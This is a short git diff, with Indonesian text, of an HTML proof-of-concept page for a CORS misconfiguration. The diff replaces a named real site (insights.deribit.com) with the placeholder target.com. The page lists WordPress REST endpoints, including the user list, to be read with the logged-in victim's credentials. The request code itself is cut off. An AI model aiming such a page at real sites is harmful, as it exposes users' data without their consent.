@@ -5,15 +5,15 @@
 </head>
 <body>
     <h1>CORS Misconfiguration PoC</h1>
-    <p>Mengakses data dari insights.deribit.com dengan kredensial pengguna yang sedang login...</p>
+    <p>Mengakses data dari target.com dengan kredensial pengguna yang sedang login...</p>
     <div id="result">Loading...</div>
 
     <script>
         // Array endpoint yang akan dicoba akses
         const endpoints = [
-            'https://insights.deribit.com/wp-json',
-            'https://insights.deribit.com/wp-json/wp/v2/users',
-            'https://insights.deribit.com/wp-json/wp/v2/posts'
+            'https://target.com/wp-json',
+            'https://target.com/wp-json/wp/v2/users',
+            'https://target.com/wp-json/wp/v2/posts'
         ];
 
         // Melakukan request ke semua endpoint
